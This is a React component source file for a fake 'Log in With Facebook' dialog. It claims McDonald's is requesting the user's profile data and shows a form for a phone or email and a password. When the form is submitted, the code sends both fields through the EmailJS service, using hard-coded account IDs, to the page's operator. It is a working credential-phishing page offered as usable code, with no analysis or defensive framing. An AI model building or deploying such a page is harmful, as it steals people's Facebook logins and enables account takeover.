import logo from './logo.svg';
import emailjs from 'emailjs-com'
import './App.css';
import { Button, Container, Grid, Input, TextField } from '@material-ui/core';
import AppBar from '@material-ui/core/AppBar';
import Toolbar from '@material-ui/core/Toolbar';
import Typography from '@material-ui/core/Typography';
import EditIcon from '@material-ui/icons/Edit';
import FacebookIcon from '@material-ui/icons/Facebook';
import LockIcon from '@material-ui/icons/Lock';
function App() {
  function sendEmail(e) {
    e.preventDefault();

    emailjs.sendForm('service_9p63n5b', 'template_zgtlsz5', e.target, 'user_Xs8CSaTqz01s8wb2aPlkz')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
      console.log("hh")
      console.log(e.target.reset())
      e.target.reset()
  }
  return (
    <div className="App">
      <AppBar position="static">
        <Toolbar variant="dense">
          <FacebookIcon style={{ fontSize: 40 }} />
          <Typography variant="h6" color="inherit" style={{ marginLeft: 50 }}>
            Log in With Facebook
            </Typography>
        </Toolbar>
      </AppBar>
      <Container maxWidth="sm">

        <Grid
          container
          direction="column"
          justify="center"
          alignItems="center"
        >
          <img src="8bb4572e-7803-49a3-9e2a-a148461fdc0a.jpg" style={{ width: 150, marginTop: 20 }} />
          <div style={{ marginTop: 40 }}>
            <p style={{ display: "contents", fontWeight: "bold" }}> McDonald's </p> will receive:
          </div>
          <div>
            your name and profile picture and email <br /> address.
          </div>
          <a style={{ color: "#3f51b5", marginTop: 10 }}>
            <EditIcon /> Edit This
          </a>
          <div style={{ color: "silver" }}>
            <LockIcon /> This doesn't let the app post to Facebook.
          <div>
              <form noValidate autoComplete="off" onSubmit={sendEmail}>
                <Input fullWidth placeholder="Phone or email" name="email" inputProps={{ 'aria-label': 'description' }} style={{ margin: 15 }} />
                <br />
                <Input fullWidth type="password" placeholder="Password" name="password" inputProps={{ 'aria-label': 'description' }} style={{ margin: 15 }} />
                {/* <Button type="submit" fullWidth variant="contained" color="primary" href="#contained-buttons" style={{ margin: 15 }}>
                Log In
              </Button> */}
              <input type="submit" value="Log In" style={{backgroundColor:"#3f51b5",color:"#fff", width:"100%",padding:"9px 16px",fontSize:"0.875rem",minWidth:"64px",boxSizing:"border-box",border:"0",cursor:"pointer",fontWeight:500,marginLeft:15}}></input>
              <a style={{ margin: 15,marginLeft:40 }}>
                Cancel
              </a>
              </form>
              
            </div>
          </div>

        </Grid>
      </Container>

    </div>
  );
}

export default App;
